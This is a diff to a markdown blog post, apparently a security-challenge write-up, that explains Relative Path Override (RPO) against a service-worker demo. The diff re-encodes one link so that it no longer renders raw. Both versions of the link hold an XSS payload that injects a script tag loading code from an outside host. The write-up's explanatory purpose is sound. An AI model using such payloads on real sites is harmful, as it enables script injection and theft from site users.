@@ -97,7 +97,7 @@ For every other type of request the code responds with a network error, i.e.,`Re
 
 This fine submission reached me when I was leaving the subway on my way home and I *really* did not understand what was going on:
 
-[https://serviceworker.on.web.security.plumbing/index.php/?name=<script/src=//0v.lv></script>](https://serviceworker.on.web.security.plumbing/index.php/?name=<script/src=//0v.lv></script>)
+[https://serviceworker.on.web.security.plumbing/index.php/?name=&lt;script/src=//0v.lv>&lt;/script>](https://serviceworker.on.web.security.plumbing/index.php/?name=%3Cscript%2Fsrc%3D%2F%2F0v.lv%3E%3C%2Fscript%3E)
 
 The really important thing to note here is that the request URL contains `/index.php/?name=`.
 This trick is called [Relative Path Override (or RPO)](http://www.thespanner.co.uk/2014/03/21/rpo/). A technique first described and coined by [Gareth Heyes](https://twitter.com/garethheyes). RPO attacks the fact that the script is loading resources from a relative path `initialize-sw.js`. The attacker providing a different request path, can thus mess up the additional resource loading. The website will attempt to load the necessary files from `/index.php/initialize-sw.js` instead and therefore fails.
